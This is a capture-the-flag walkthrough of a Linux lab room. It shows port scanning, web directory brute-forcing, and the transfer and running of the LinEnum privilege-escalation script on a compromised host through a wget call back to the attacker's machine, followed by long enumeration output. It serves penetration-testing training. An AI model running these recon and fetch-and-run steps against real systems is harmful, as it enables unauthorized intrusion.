---
A guided room taking you through infiltrating and exploiting a Linux system.
---

# The Cod Caper — Writeup

## Overview
### The Cod Caper — Writeup
### The Cod Caper — Writeup
### Intro
Hello there my name is Pingu. I've come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn't eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server. As all penguins are natural experts in penetration testing, I figured I could get the key myself! Unfortunately he banned every IP from Antarctica, so I am unable to do anything to the server. Therefore I call upon you my dear ally to help me get my fish back! Naturally I'll be guiding you through the process.
Note: This room expects some basic pen testing knowledge, as I will not be going over every tool in detail that is used. While you can just use the room to follow through, some interest or experiencing in assembly is highly recommended

## Enumeration
The first step is to see what ports and services are running on the target machine.
Recommended Tool - nmap:
Useful flags:
-p
Used to specify which port to analyze, can also be used to specify a range of ports i.e `-p 1-1000`
-sC
Runs default scripts on the port, useful for doing basic analysis on the service running on a port
-A
Aggressive mode, go all out and try to get as much information as possible
Answer the questions below
```text
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.181.221 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.181.221:22
Open 10.10.181.221:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-26 20:50 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 0.00s elapsed
Initiating Ping Scan at 20:50
Scanning 10.10.181.221 [2 ports]
Completed Ping Scan at 20:50, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:50
Completed Parallel DNS resolution of 1 host. at 20:50, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:50
Scanning 10.10.181.221 [2 ports]
Discovered open port 80/tcp on 10.10.181.221
Discovered open port 22/tcp on 10.10.181.221
Completed Connect Scan at 20:50, 0.20s elapsed (2 total ports)
Initiating Service scan at 20:50
Scanning 2 services on 10.10.181.221
Completed Service scan at 20:50, 6.51s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.181.221.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 5.71s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 0.81s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 0.00s elapsed
Nmap scan report for 10.10.181.221
Host is up, received syn-ack (0.20s latency).
Scanned at 2022-12-26 20:50:39 EST for 13s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d2c401b6c157cfcbf9b5522612a56fc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDs2k31WKwi9eUwlvpMuWNMzFjChpDu4IcM3k6VLyq3IEnYuZl2lL/dMWVGCKPfnJ1yv2IZVk1KXha7nSIR4yxExRDx7Ybi7ryLUP/XTrLtBwdtJZB7k48EuS8okvYLk4ppG1MRvrVojNPprF4nh5S0EEOowqGoiHUnGWOzYSgvaLAgvr7ivZxSsFCLqvdmieErVrczCBOqDOcPH9ZD/q6WalyHMccZWVL3Gk5NmHPaYDd9ozVHCMHLq7brYxKrUcoOtDhX7btNamf+PxdH5I9opt6aLCjTTLsBPO2v5qZYPm1Rod64nysurgnEKe+e4ZNbsCvTc1AaYKVC+oguSNmT
|   256 ff893298f4779c0939f5af4a4f08d6f5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmpmAEGyFxyUqlKmlCnCeQW4KXOpnSG6SwmjD5tGSoYaz5Fh1SFMNP0/KNZUStQK9KJmz1vLeKI03nLjIR1sho=
|   256 899263e71d2b3aaf6cf939565b557ef9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBIRpiANvrp1KboZ6vAeOeYL68yOjT0wbxgiavv10kC
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.00 seconds
```
How many ports are open on the target machine?
*2*
What is the http-title of the web server?
http-title is a default script?
*Apache2 Ubuntu Default Page: It works*
What version is the ssh service?
*OpenSSH 7.2p2 Ubuntu 4ubuntu2.8*
What is the version of the web server?
*Apache/2.4.18*
Since the only services running are SSH and Apache, it is safe to assume that we should check out the web server first for possible vulnerabilities. One of the first things to do is to see what pages are available to access on the web server.
Recommended tool: gobuster
Useful flags:
-x
Used to specify file extensions i.e "php,txt,html"
--url
Used to specify which url to enumerate
--wordlist
Used to specify which wordlist that is appended on the url path i.e
"http://url.com/word1"
"http://url.com/word2"
"http://url.com/word3.php"
Recommended wordlist: [big.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt)
What is the name of the important file on the server?
```text
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.181.221/ -w /usr/share/wordlists/dirb/common.txt -t 64 -k -x txt,php,py,html
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.181.221/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              txt,php,py,html
[+] Timeout:                 10s
===============================================================
2022/12/26 20:56:34 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.php        (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/.htpasswd.py         (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/.hta.py              (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.py         (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/administrator.php    (Status: 200) [Size: 409]
```
*administrator.php*
LinEnum is a bash script that searches for possible ways to priv esc. It is incredibly popular due to the sheer amount of possible methods that it checks for, and often times Linenum is one of the first things to try when you get shell access.
Methods to get Linenum on the system
Method 1: SCP
Since you have ssh access on the machine you can use SCP to copy files over. In the case of Linenum you would run `scp {path to linenum} {user}@{host}:{path}. Example: scp /opt/LinEnum.sh pingu@10.10.10.10:/tmp   ` would put LinEnum in /tmp.
Method 2: SimpleHTTPServer
SimpleHTTPServer is a module that hosts a basic webserver on your host machine. Assuming the machine you compromised has a way to remotely download files, you can host LinEnum and download it.
Note: There are numerous ways to do this and the two listed above are just my personal favorites.
Once You have LinEnum on the system, its as simple as running it and looking at the output above once it finishes.
Answer the questions below
```text
┌──(kali㉿kali)-[~]
└─$ locate LinEnum
/home/kali/Downloads/LinEnum.sh
```
```text
┌──(kali㉿kali)-[~]
└─$ cd /home/kali/Downloads
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

pingu@ubuntu:~$ cd /tmp
pingu@ubuntu:/tmp$ ls
p  systemd-private-8858506f7bd24cd1a414a769c3dfc612-systemd-timesyncd.service-oolTiU  VMwareDnD
pingu@ubuntu:/tmp$ wget http://10.8.19.103:80/LinEnum.sh
--2022-12-26 19:30:09--  http://10.8.19.103/LinEnum.sh
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh                  100%[=========================================>]  45.54K  68.7KB/s    in 0.7s    

2022-12-26 19:30:10 (68.7 KB/s) - ‘LinEnum.sh’ saved [46631/46631]
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.181.221 - - [26/Dec/2022 22:30:09] "GET /LinEnum.sh HTTP/1.1" 200 -

pingu@ubuntu:/tmp$ chmod +x LinEnum.sh;./LinEnum.sh

#########################################################
```
```text
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
```
```text
# www.rebootuser.com
```
```text
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled

Scan started at:
Mon Dec 26 19:30:30 PST 2022                                                                                  
                                                                                                              

### SYSTEM ##############################################
[-] Kernel information:
Linux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

[-] Kernel information (continued):
Linux version 4.4.0-142-generic (buildd@lgw01-amd64-033) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019

[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial

[-] Hostname:
ubuntu

### USER/GROUP ##########################################
[-] Current user/group info:
uid=1002(pingu) gid=1002(pingu) groups=1002(pingu),4(adm),24(cdrom),27(sudo),30(dip)

[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             tty1                      Thu Jan 16 21:09:47 -0800 2020
papa             tty1                      Thu Jan 16 20:15:17 -0800 2020
pingu            pts/1    10.8.19.103      Mon Dec 26 19:26:47 -0800 2022

[-] Who else is logged on:
 19:30:30 up  1:59,  1 user,  load average: 0.06, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
pingu    pts/1    10.8.19.103      19:26    6.00s  0.02s  0.00s /bin/bash ./LinEnum.sh

[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=107(uuidd) gid=111(uuidd) groups=111(uuidd)
uid=1000(papa) gid=1000(papa) groups=1000(papa),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
uid=108(mysql) gid=116(mysql) groups=116(mysql)
uid=109(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1002(pingu) gid=1002(pingu) groups=1002(pingu),4(adm),24(cdrom),27(sudo),30(dip)

[-] It looks like we have some admin users:
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=1000(papa) gid=1000(papa) groups=1000(papa),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
uid=1002(pingu) gid=1002(pingu) groups=1002(pingu),4(adm),24(cdrom),27(sudo),30(dip)

[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
papa:x:1000:1000:qaa:/home/papa:/bin/bash
mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
pingu:x:1002:1002::/home/pingu:/bin/bash

[-] Super user account(s):
root

[-] Accounts that have recently used sudo:
/home/papa/.sudo_as_admin_successful

[-] Are permissions on /home directories lax:
total 16K
drwxr-xr-x  4 root  root  4.0K Jan 15  2020 .
drwxr-xr-x 24 root  root  4.0K Jan 15  2020 ..
drwxr-xr-x  5 papa  papa  4.0K Jan 15  2020 papa
drwxrwxrwx  6 pingu pingu 4.0K Jan 20  2020 pingu

### ENVIRONMENTAL #######################################
[-] Environment information:
XDG_SESSION_ID=7
SHELL=/bin/bash
TERM=xterm-256color
SSH_CLIENT=10.8.19.103 53272 22
SSH_TTY=/dev/pts/1
USER=pingu
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
MAIL=/var/mail/pingu
PWD=/tmp
LANG=en_US.UTF-8
HOME=/home/pingu
SHLVL=2
LANGUAGE=en_US:
LOGNAME=pingu
SSH_CONNECTION=10.8.19.103 53272 10.10.181.221 22
XDG_RUNTIME_DIR=/run/user/1002
_=/usr/bin/env

[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
drwxr-xr-x 2 root root  4096 Jan 15  2020 /bin
drwxr-xr-x 2 root root  4096 Jan 15  2020 /sbin
drwxr-xr-x 2 root root 20480 Jan 16  2020 /usr/bin
drwxr-xr-x 2 root root  4096 Apr 12  2016 /usr/games
drwxr-xr-x 2 root root  4096 Jan 15  2020 /usr/local/bin
drwxr-xr-x 2 root root  4096 Feb 26  2019 /usr/local/games
drwxr-xr-x 2 root root  4096 Feb 26  2019 /usr/local/sbin
drwxr-xr-x 2 root root  4096 Jan 15  2020 /usr/sbin

[-] Available shells:
```
```text
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux

[-] Current umask value:
0002
u=rwx,g=rwx,o=rx

[-] umask value as specified in /etc/login.defs:
UMASK           022

[-] Password and storage information:
PASS_MAX_DAYS   99999
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512

### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rw-r--r--  1 root root  670 Jun 22  2017 php
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  191 Jan 15  2020 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rwxr-xr-x  1 root root  539 Jun 11  2018 apache2
-rwxr-xr-x  1 root root 1474 Oct  9  2018 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  5  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  435 Nov 17  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

[-] Crontab contents:
```
```text
# /etc/crontab: system-wide crontab
```
```text
# Unlike any other crontab you don't have to run the `crontab'
```
```text
# command to install the new version when you edit this file
```
```text
# and files in /etc/cron.d. These files also have username fields,
```
```text
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```
```text
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

[-] Systemd timers:
NEXT                         LEFT     LAST                         PASSED       UNIT                         ACTIVATES
Tue 2022-12-27 06:12:09 PST  10h left Mon 2022-12-26 17:31:02 PST  1h 59min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Tue 2022-12-27 06:41:25 PST  11h left Mon 2022-12-26 18:02:24 PST  1h 28min ago apt-daily.timer              apt-daily.service
Tue 2022-12-27 17:45:47 PST  22h left Mon 2022-12-26 17:45:47 PST  1h 44min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

3 timers listed.
Enable thorough tests to see inactive timers

### NETWORKING  ##########################################
[-] Network and IP info:
eth0      Link encap:Ethernet  HWaddr 02:69:96:73:26:3b  
          inet addr:10.10.181.221  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::69:96ff:fe73:263b/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:79453 errors:0 dropped:0 overruns:0 frame:0
          TX packets:78973 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:6228068 (6.2 MB)  TX bytes:10532103 (10.5 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:1241 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1241 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:117896 (117.8 KB)  TX bytes:117896 (117.8 KB)

[-] ARP history:
ip-10-10-0-1.eu-west-1.compute.internal (10.10.0.1) at 02:c8:85:b5:5a:aa [ether] on eth0

[-] Nameserver(s):
nameserver 10.0.0.2

[-] Default route:
default         ip-10-10-0-1.eu 0.0.0.0         UG    0      0        0 eth0

[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               

[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               

### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  1.0  37828  5440 ?        Ss   17:30   0:06 /sbin/init noprompt
root         2  0.0  0.0      0     0 ?        S    17:30   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    17:30   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   17:30   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        S    17:30   0:00 [kworker/u30:0]
root         7  0.0  0.0      0     0 ?        S    17:30   0:00 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    17:30   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    17:30   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S    17:30   0:00 [watchdog/0]
root        11  0.0  0.0      0     0 ?        S    17:30   0:00 [kdevtmpfs]
root        12  0.0  0.0      0     0 ?        S<   17:30   0:00 [netns]
root        13  0.0  0.0      0     0 ?        S<   17:30   0:00 [perf]
root        14  0.0  0.0      0     0 ?        S    17:30   0:00 [xenwatch]
root        15  0.0  0.0      0     0 ?        S    17:30   0:00 [xenbus]
root        17  0.0  0.0      0     0 ?        S    17:30   0:00 [khungtaskd]
root        18  0.0  0.0      0     0 ?        S<   17:30   0:00 [writeback]
root        19  0.0  0.0      0     0 ?        SN   17:30   0:00 [ksmd]
root        20  0.0  0.0      0     0 ?        S<   17:30   0:00 [crypto]
root        21  0.0  0.0      0     0 ?        S<   17:30   0:00 [kintegrityd]
root        22  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root        23  0.0  0.0      0     0 ?        S<   17:30   0:00 [kblockd]
root        24  0.0  0.0      0     0 ?        S<   17:30   0:00 [ata_sff]
root        25  0.0  0.0      0     0 ?        S<   17:30   0:00 [md]
root        26  0.0  0.0      0     0 ?        S<   17:30   0:00 [devfreq_wq]
root        27  0.0  0.0      0     0 ?        S    17:30   0:00 [kworker/u30:1]
root        29  0.0  0.0      0     0 ?        S    17:30   0:00 [kswapd0]
root        30  0.0  0.0      0     0 ?        S<   17:30   0:00 [vmstat]
root        31  0.0  0.0      0     0 ?        S    17:30   0:00 [fsnotify_mark]
root        32  0.0  0.0      0     0 ?        S    17:30   0:00 [ecryptfs-kthrea]
root        48  0.0  0.0      0     0 ?        S<   17:30   0:00 [kthrotld]
root        49  0.0  0.0      0     0 ?        S<   17:30   0:00 [acpi_thermal_pm]
root        50  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root        51  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root        52  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root        53  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root        54  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root        55  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root        56  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root        57  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root        58  0.0  0.0      0     0 ?        S    17:30   0:00 [scsi_eh_0]
root        59  0.0  0.0      0     0 ?        S<   17:30   0:00 [scsi_tmf_0]
root        60  0.0  0.0      0     0 ?        S    17:30   0:00 [scsi_eh_1]
root        61  0.0  0.0      0     0 ?        S<   17:30   0:00 [scsi_tmf_1]
root        67  0.0  0.0      0     0 ?        S<   17:30   0:00 [ipv6_addrconf]
root        69  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root        81  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root        82  0.0  0.0      0     0 ?        S<   17:30   0:00 [deferwq]
root        83  0.0  0.0      0     0 ?        S<   17:30   0:00 [charger_manager]
root       122  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root       123  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root       124  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root       125  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root       126  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root       127  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root       128  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root       129  0.0  0.0      0     0 ?        S<   17:30   0:00 [bioset]
root       130  0.0  0.0      0     0 ?        S<   17:30   0:00 [kpsmoused]
root       132  0.0  0.0      0     0 ?        S<   17:30   0:00 [ttm_swap]
root       154  0.0  0.0      0     0 ?        S    17:30   0:00 [jbd2/xvda1-8]
root       155  0.0  0.0      0     0 ?        S<   17:30   0:00 [ext4-rsv-conver]
root       185  0.0  0.0      0     0 ?        S<   17:30   0:00 [kworker/0:1H]
root       197  0.0  0.4  27704  2364 ?        Ss   17:30   0:00 /lib/systemd/systemd-journald
root       218  0.0  0.0      0     0 ?        S    17:30   0:00 [kauditd]
root       271  0.0  0.7  45236  3944 ?        Ss   17:30   0:01 /lib/systemd/systemd-udevd
systemd+   316  0.0  0.4 100324  2292 ?        Ssl  17:30   0:00 /lib/systemd/systemd-timesyncd
root       523  0.0  0.7 275868  3744 ?        Ssl  17:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       531  0.0  0.4  29008  2444 ?        Ss   17:31   0:00 /usr/sbin/cron -f
root       533  0.0  0.5  28544  2896 ?        Ss   17:31   0:00 /lib/systemd/systemd-logind
message+   535  0.0  0.6  42900  3400 ?        Ss   17:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
syslog     550  0.0  0.5 256392  2832 ?        Ssl  17:31   0:00 /usr/sbin/rsyslogd -n
root       583  0.0  0.3  15752  1788 ttyS0    Ss+  17:31   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root       584  0.0  0.3  15936  1568 tty1     Ss+  17:31   0:00 /sbin/agetty --noclear tty1 linux
